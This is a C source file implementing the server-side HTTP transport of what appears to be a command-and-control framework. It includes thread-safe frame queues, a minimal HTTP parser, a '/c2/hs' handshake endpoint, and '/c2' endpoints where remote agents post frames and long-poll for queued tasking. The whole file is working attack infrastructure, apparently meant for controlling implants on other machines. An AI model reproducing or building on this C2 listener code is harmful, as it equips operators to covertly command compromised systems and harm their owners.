/*==========================================================================
 * transport_http_server.c  -  HTTP transport backend server side (Linux)
 *==========================================================================*/

#define _POSIX_C_SOURCE 200112L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#include "transport.h"
#include "crypto_dragon.h"

#define HTTP_SRV_BACKLOG         32
#define HTTP_LONG_POLL_MS      20000
#define HTTP_QUEUE_SLOTS          32
#define HTTP_MAX_HDRS           4096

typedef struct { uint8_t data[FRAME_SIZE]; } FrameSlot;

typedef struct {
    FrameSlot       slots[HTTP_QUEUE_SLOTS];
    int             head, tail, count;
    pthread_mutex_t mu;
    pthread_cond_t  not_empty;
    pthread_cond_t  not_full;
} FrameQueue;

static void fq_init(FrameQueue *q) {
    memset(q, 0, sizeof *q);
    pthread_mutex_init(&q->mu, NULL);
    pthread_cond_init(&q->not_empty, NULL);
    pthread_cond_init(&q->not_full, NULL);
}
static void fq_destroy(FrameQueue *q) {
    pthread_mutex_destroy(&q->mu);
    pthread_cond_destroy(&q->not_empty);
    pthread_cond_destroy(&q->not_full);
}
static int fq_push(FrameQueue *q, const uint8_t *frame) {
    pthread_mutex_lock(&q->mu);
    if (q->count == HTTP_QUEUE_SLOTS) {
        struct timespec ts;
        clock_gettime(CLOCK_REALTIME, &ts);
        ts.tv_sec += 10;
        while (q->count == HTTP_QUEUE_SLOTS)
            if (pthread_cond_timedwait(&q->not_full,&q->mu,&ts)==ETIMEDOUT){
                pthread_mutex_unlock(&q->mu); return -1;
            }
    }
    memcpy(q->slots[q->tail].data, frame, FRAME_SIZE);
    q->tail = (q->tail + 1) % HTTP_QUEUE_SLOTS;
    q->count++;
    pthread_cond_signal(&q->not_empty);
    pthread_mutex_unlock(&q->mu);
    return 0;
}
static int fq_pop(FrameQueue *q, uint8_t *frame, int timeout_ms) {
    pthread_mutex_lock(&q->mu);
    if (q->count == 0) {
        if (timeout_ms == 0) { pthread_mutex_unlock(&q->mu); return -1; }
        struct timespec ts;
        if (timeout_ms > 0) {
            clock_gettime(CLOCK_REALTIME, &ts);
            ts.tv_sec  += timeout_ms / 1000;
            ts.tv_nsec += (timeout_ms % 1000) * 1000000L;
            if (ts.tv_nsec >= 1000000000L){ts.tv_sec++;ts.tv_nsec-=1000000000L;}
        }
        while (q->count == 0) {
            int r = (timeout_ms>0)
                  ? pthread_cond_timedwait(&q->not_empty,&q->mu,&ts)
                  : pthread_cond_wait(&q->not_empty,&q->mu);
            if (r==ETIMEDOUT){pthread_mutex_unlock(&q->mu);return -1;}
        }
    }
    memcpy(frame, q->slots[q->head].data, FRAME_SIZE);
    q->head = (q->head + 1) % HTTP_QUEUE_SLOTS;
    q->count--;
    pthread_cond_signal(&q->not_full);
    pthread_mutex_unlock(&q->mu);
    return 0;
}

struct transport_conn {
    FrameQueue         rx_q;
    FrameQueue         tx_q;
    struct sockaddr_in addr;
    volatile int       running;
    volatile int       ready;
    pthread_mutex_t    ready_mu;
    pthread_cond_t     ready_cond;
};

typedef struct VConn {
    struct sockaddr_in  addr;
    transport_conn_t   *conn;
    struct VConn       *next;
} VConn;

typedef struct {
    int              listener_fd;
    VConn           *clients;
    pthread_mutex_t  mu;
    transport_conn_t *new_conn;
    pthread_cond_t   new_cond;
    pthread_t        dispatcher_tid;
    volatile int     running;
} ListenerState;

#define MAX_LISTENERS 8
static ListenerState *g_listeners[MAX_LISTENERS];
static int            g_nlisteners = 0;
static pthread_mutex_t g_listeners_mu = PTHREAD_MUTEX_INITIALIZER;

static ListenerState *find_listener_state(int fd) {
    pthread_mutex_lock(&g_listeners_mu);
    for (int i = 0; i < g_nlisteners; i++)
        if (g_listeners[i] && g_listeners[i]->listener_fd == fd) {
            pthread_mutex_unlock(&g_listeners_mu);
            return g_listeners[i];
        }
    pthread_mutex_unlock(&g_listeners_mu);
    return NULL;
}

static int read_exact(int fd, void *buf, size_t n) {
    size_t got=0;
    while(got<n){ssize_t r=read(fd,(char*)buf+got,n-got);if(r<=0)return -1;got+=r;}
    return 0;
}
static int write_exact(int fd, const void *buf, size_t n) {
    size_t s=0;
    while(s<n){ssize_t w=write(fd,(const char*)buf+s,n-s);if(w<=0)return -1;s+=w;}
    return 0;
}

typedef struct {
    char    method[8];
    char    path[64];
    uint8_t body[FRAME_SIZE + 64];
    size_t  body_len;
} HttpRequest;

static int http_read_request(int fd, HttpRequest *req) {
    char hdr[HTTP_MAX_HDRS]; int hlen=0;
    while(hlen<(int)sizeof(hdr)-1){
        if(read(fd,hdr+hlen,1)!=1)return -1;
        hlen++; hdr[hlen]='\0';
        if(hlen>=4&&memcmp(hdr+hlen-4,"\r\n\r\n",4)==0)break;
    }
    char *nl=strstr(hdr,"\r\n"); if(!nl)return -1;
    char first[256]; int flen=(int)(nl-hdr);
    if(flen<=0||flen>=(int)sizeof first)return -1;
    memcpy(first,hdr,flen); first[flen]='\0';
    char *sp1=strchr(first,' '); if(!sp1)return -1; *sp1='\0';
    strncpy(req->method,first,sizeof(req->method)-1);
    req->method[sizeof(req->method)-1]='\0';
    char *sp2=strchr(sp1+1,' '); if(sp2)*sp2='\0';
    strncpy(req->path,sp1+1,sizeof(req->path)-1);
    req->path[sizeof(req->path)-1]='\0';
    req->body_len=0;
    char *cl=strcasestr(hdr,"Content-Length:"); if(!cl)return 0;
    size_t clen=(size_t)strtoul(cl+15,NULL,10);
    if(clen==0)return 0;
    if(clen>sizeof req->body)return -1;
    if(read_exact(fd,req->body,clen)!=0)return -1;
    req->body_len=clen;
    return 0;
}

static int http_respond(int fd, int code, const uint8_t *body, size_t blen) {
    char hdr[256]; int hlen;
    if(body&&blen>0){
        hlen=snprintf(hdr,sizeof hdr,
            "HTTP/1.1 %d OK\r\nContent-Type: application/octet-stream\r\n"
            "Content-Length: %zu\r\nConnection: keep-alive\r\n\r\n",code,blen);
    } else {
        hlen=snprintf(hdr,sizeof hdr,
            "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\n"
            "Connection: keep-alive\r\n\r\n");
    }
    if(write_exact(fd,hdr,(size_t)hlen)!=0)return -1;
    if(body&&blen>0)if(write_exact(fd,body,blen)!=0)return -1;
    return 0;
}

typedef struct { int fd; ListenerState *ls; } DispatchArg;

static void *http_dispatch_one(void *arg) {
    DispatchArg *da=(DispatchArg*)arg; int fd=da->fd;
    ListenerState *ls=da->ls;
    struct sockaddr_in caddr={0};
    socklen_t clen=sizeof caddr;
    getpeername(fd,(struct sockaddr*)&caddr,&clen);
    free(da);

    while(1){
        HttpRequest req; memset(&req,0,sizeof req);
        if(http_read_request(fd,&req)!=0){close(fd);return NULL;}

        transport_conn_t *conn=NULL;
        pthread_mutex_lock(&ls->mu);
        for(VConn *v=ls->clients;v;v=v->next)
            if(v->addr.sin_addr.s_addr==caddr.sin_addr.s_addr){conn=v->conn;break;}

        if(strcmp(req.method,"POST")==0&&strcmp(req.path,"/c2/hs")==0&&req.body_len==32){
            if(!conn){
                conn=calloc(1,sizeof *conn);
                fq_init(&conn->rx_q); fq_init(&conn->tx_q);
                conn->addr=caddr; conn->running=1;
                pthread_mutex_init(&conn->ready_mu,NULL);
                pthread_cond_init(&conn->ready_cond,NULL);
                VConn *v=malloc(sizeof *v);
                if(v){v->addr=caddr;v->conn=conn;v->next=ls->clients;ls->clients=v;}
            } else {
                /* Reconnect */
                pthread_mutex_lock(&conn->rx_q.mu);
                conn->rx_q.head=conn->rx_q.tail=conn->rx_q.count=0;
                pthread_mutex_unlock(&conn->rx_q.mu);
                pthread_mutex_lock(&conn->tx_q.mu);
                conn->tx_q.head=conn->tx_q.tail=conn->tx_q.count=0;
                pthread_mutex_unlock(&conn->tx_q.mu);
            }
            uint8_t padded[FRAME_SIZE]={0};
            memcpy(padded,req.body,32);
            fq_push(&conn->rx_q,padded);
            http_respond(fd,204,NULL,0);
            conn->ready=1;
            ls->new_conn=conn;
            pthread_cond_signal(&ls->new_cond);
            pthread_mutex_unlock(&ls->mu);
            continue;
        }
        pthread_mutex_unlock(&ls->mu);

        if(!conn){
            http_respond(fd,404,NULL,0);
            close(fd); return NULL;
        }

        if(strcmp(req.method,"POST")==0&&strcmp(req.path,"/c2")==0&&req.body_len==FRAME_SIZE){
            fq_push(&conn->rx_q,req.body);
            http_respond(fd,204,NULL,0);
        }
        else if(strcmp(req.method,"GET")==0&&strcmp(req.path,"/c2")==0){
            uint8_t frame[FRAME_SIZE];
            if(fq_pop(&conn->tx_q,frame,HTTP_LONG_POLL_MS)==0)
                http_respond(fd,200,frame,FRAME_SIZE);
            else
                http_respond(fd,204,NULL,0);
        }
        else {
            http_respond(fd,404,NULL,0);
            close(fd); return NULL;
        }
    }
    return NULL;
}

static void *http_dispatcher_thread(void *arg) {
    ListenerState *ls=(ListenerState*)arg;
    while(ls->running){
        struct sockaddr_in caddr; socklen_t clen=sizeof caddr;
        int cfd=accept(ls->listener_fd,(struct sockaddr*)&caddr,&clen);
        if(cfd<0){if(!ls->running)break;continue;}
        DispatchArg *da=malloc(sizeof *da);
        if(!da){close(cfd);continue;}
        da->fd=cfd; da->ls=ls;
        pthread_t tid;
        if(pthread_create(&tid,NULL,http_dispatch_one,da)!=0){free(da);close(cfd);}
        else pthread_detach(tid);
    }
    return NULL;
}

static int http_srv_listen(int port) {
    int fd=socket(AF_INET,SOCK_STREAM,0); if(fd<0)return -1;
    int yes=1; setsockopt(fd,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof yes);
    struct sockaddr_in sa={0};
    sa.sin_family=AF_INET; sa.sin_addr.s_addr=INADDR_ANY;
    sa.sin_port=htons((uint16_t)port);
    if(bind(fd,(struct sockaddr*)&sa,sizeof sa)<0){close(fd);return -1;}
    if(listen(fd,HTTP_SRV_BACKLOG)<0){close(fd);return -1;}

    ListenerState *ls=calloc(1,sizeof *ls);
    if(!ls){close(fd);return -1;}
    ls->listener_fd=fd; ls->running=1;
    pthread_mutex_init(&ls->mu,NULL);
    pthread_cond_init(&ls->new_cond,NULL);

    if(pthread_create(&ls->dispatcher_tid,NULL,http_dispatcher_thread,ls)!=0){
        free(ls);close(fd);return -1;
    }
    pthread_detach(ls->dispatcher_tid);

    pthread_mutex_lock(&g_listeners_mu);
    if(g_nlisteners<MAX_LISTENERS)g_listeners[g_nlisteners++]=ls;
    pthread_mutex_unlock(&g_listeners_mu);
    return fd;
}

static transport_conn_t *http_srv_connect(const char *h,int p){(void)h;(void)p;return NULL;}

static transport_conn_t *http_srv_accept(int listener_fd, struct sockaddr_in *out_addr) {
    ListenerState *ls=find_listener_state(listener_fd);
    if(!ls)return NULL;
    pthread_mutex_lock(&ls->mu);
    while(!ls->new_conn)pthread_cond_wait(&ls->new_cond,&ls->mu);
    transport_conn_t *conn=ls->new_conn; ls->new_conn=NULL;
    pthread_mutex_unlock(&ls->mu);
    if(out_addr)*out_addr=conn->addr;
    return conn;
}

static int http_srv_send(transport_conn_t *conn, const uint8_t *buf, size_t len) {
    if(!conn||!buf||len==0)return -1;
    if(len!=FRAME_SIZE)return -1;
    if(fq_push(&conn->tx_q,buf)!=0)return -1;
    return (int)FRAME_SIZE;
}

static int http_srv_recv(transport_conn_t *conn, uint8_t *buf, size_t len) {
    if(!conn||!buf||len==0)return -1;
    uint8_t frame[FRAME_SIZE];
    if(fq_pop(&conn->rx_q,frame,-1)!=0)return -1;
    size_t copy=(len<FRAME_SIZE)?len:FRAME_SIZE;
    memcpy(buf,frame,copy);
    return (int)copy;
}

static int http_srv_poll(transport_conn_t *conn, int timeout_ms) {
    if(!conn)return -1;
    pthread_mutex_lock(&conn->rx_q.mu);
    int count=conn->rx_q.count;
    pthread_mutex_unlock(&conn->rx_q.mu);
    if(count>0)return 1;
    if(timeout_ms==0)return 0;
    pthread_mutex_lock(&conn->rx_q.mu);
    struct timespec ts; clock_gettime(CLOCK_REALTIME,&ts);
    int ms=(timeout_ms>0)?timeout_ms:20000;
    ts.tv_sec+=ms/1000; ts.tv_nsec+=(ms%1000)*1000000L;
    if(ts.tv_nsec>=1000000000L){ts.tv_sec++;ts.tv_nsec-=1000000000L;}
    while(conn->rx_q.count==0)
        if(pthread_cond_timedwait(&conn->rx_q.not_empty,&conn->rx_q.mu,&ts)==ETIMEDOUT){
            pthread_mutex_unlock(&conn->rx_q.mu);return 0;
        }
    pthread_mutex_unlock(&conn->rx_q.mu);
    return 1;
}

static void http_srv_close(transport_conn_t *conn) {
    if(!conn)return;
    conn->running=0;
    pthread_cond_broadcast(&conn->rx_q.not_empty);
    pthread_cond_broadcast(&conn->tx_q.not_empty);
    fq_destroy(&conn->rx_q); fq_destroy(&conn->tx_q);
    pthread_mutex_destroy(&conn->ready_mu);
    pthread_cond_destroy(&conn->ready_cond);
    free(conn);
}

static void http_srv_close_listener(int fd) {
    ListenerState *ls=find_listener_state(fd);
    if(ls)ls->running=0;
    shutdown(fd,SHUT_RDWR); close(fd);
}

static int http_srv_get_fd(transport_conn_t *conn){(void)conn;return -1;}

transport_t TRANSPORT_HTTP = {
    .name="http", .listen=http_srv_listen, .connect=http_srv_connect,
    .accept=http_srv_accept, .send=http_srv_send, .recv=http_srv_recv,
    .poll=http_srv_poll, .close=http_srv_close,
    .close_listener=http_srv_close_listener, .get_fd=http_srv_get_fd,
};